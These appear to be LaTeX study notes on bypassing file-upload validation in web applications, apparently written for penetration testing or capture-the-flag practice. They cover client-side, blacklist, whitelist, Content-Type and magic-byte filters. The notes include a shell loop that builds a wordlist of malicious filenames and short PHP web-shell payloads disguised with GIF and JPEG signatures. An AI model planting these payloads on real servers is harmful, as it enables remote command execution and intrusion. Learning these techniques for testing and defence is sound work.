\section{Bypassing filters}
\subsection{Client-Side validation}
Many web applications only rely on front-end JavaScript code to validate the
selected file format before it is uploaded and would not upload it if the file
is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, it  can
be easily bypassed by directly interacting with the server, skipping the
front-end validations altogether or by  modifying the front-end code through
the  browser's dev tools to disable any validation in place.

\subsubsection{Request Modification}
Capture the upload request with Burp or Zap
\subsubsection{Disableing validation}
Use the  browser's Page Inspector, fnd the validation function and read the
code using the browser's Console (size the name of the function click on run
and then on the ouput click on 'jump to definition' icon).

it is possible to remove either the call or edit its parameters.

\subsection{Blacklist validation}
The backend validation maycheck the {\bf file type} or the {\bf file content} 
for type matching. The weakest form of validation amongst these is {\bf testing
the file extension against a blacklist of extension} to determine whether the
upload request should be blocked. 

This validation method has a major flaw. It is not comprehensive, as many other
extensions are not included in this list, which may still be used to execute
PHP code on the back-end server if uploaded. {\bf PayloadsAllTheThings}
provides lists of extensions for
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst}{PHP}
    and
    \href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP}{.NET} web applications


Using {\bf burp Intruder}(untick \verb+URL-encode these\ldots+ in payload) (or
Zap equivalent) it is possible to replay the upload request by fuzzing the
extention.


\subsection{whitelist validation}
he other type of file extension validation is by utilizing a whitelist of
allowed file extensions. A whitelist is generally more secure than a
blacklist.

We can still trick some validation function. For example 
\verb+preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)+  The issue here lies
within the regex, as it only checks whether the file name contains the
extension and not if it actually ends with it.

Tricks to use:
\begin{itemize}
    \item  double extention: (\verb+shell.jpg.php+)
    \item reverse double extension (\verb+shell.php.jpg+)
    \item Character Injection: inject several characters before or after the
        final extension to cause the web application to misinterpret the
        filename and execute the uploaded file as a PHP script. for example 
        \verb+%20 %0a %00+ which lead for example in \verb+(shell.php%00.jpg+.
\end{itemize}

\begin{verbatim}
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
\end{verbatim}


\subsection{Type filters}

many modern web servers and web applications also test the content of the
uploaded file to ensure it matches the specified type. While extension filters
may accept several extensions, content filters usually specify a single
category (e.g., images, videos, documents), which is why they do not typically
use blacklists or whitelists. This is because web servers provide functions to
check for the file content type, and it usually falls under a specific
category.

There are two common methods for validating the file content:
\verb+Content-Type Header+ or \verb+File Content+. Let's see how we can
identify each filter and how to bypass both of them.

\subsubsection{Content-type}

Using {\bf burp intruder} it is possible to fuzz the \verb+content-type+ with a
list such as
\href{https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt}{SecLists'
Content-Type Wordlist}.

{\bf Note}: A file upload HTTP request has two Content-Type headers, one for the
attached file (at the bottom), and one for the full request (at the top). We
usually need to modify the file's Content-Type header, but in some cases the
request will only contain the main Content-Type header (e.g. if the uploaded
content was sent as POST data), in which case we will need to modify the main
Content-Type header.

\subsubsection{MIME-type / magic bytes}
The second and more common type of file content validation is testing the
uploaded file's {\bf Multipurpose Internet Mail Extensions} (MIME) which is an
internet standard that determines the type of a file through its general format
and bytes structure.

This is usually done by inspecting the first few bytes of the file's content,
which contain the
\href{https://en.wikipedia.org/wiki/List_of_file_signatures}{File Signature} or
\href{https://opensource.apple.com/source/file/file-23/file/magic/magic.mime}{Magic
Bytes}. For example, if a file starts with (\verb+GIF87a+ or \verb+GIF89a+),
this indicates that it is a \verb+GIF+ image, while a file starting with
plaintext is usually considered a \verb+Text+ file. 

Changing the first bytes of any file to the GIF magic bytes, its MIME type
would be changed to a GIF image, regardless of its remaining content or
extension.

Tip: Many other image types have non-printable bytes for their file signatures,
while a GIF image starts with ASCII printable bytes (as shown above), so it is
the easiest to imitate. Furthermore, as the string GIF8 is common between both
GIF signatures, it is usually enough to imitate a GIF image.

\begin{verbatim}
GIF89a; <?php system($_GET['cmd']); ?>
or 
GIF8; <?php system($_GET['cmd']); ?>
\end{verbatim}

to bypass \verb+image/jpeg+
\begin{verbatim}
ÿØÿî<?php  system('cat /flag*', $ret); echo "$ret "; ?>
\end{verbatim}


\subsubsection{Polyglot Files}
\href{https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a}{Polyglot
Files: a Hacker’s best friend}

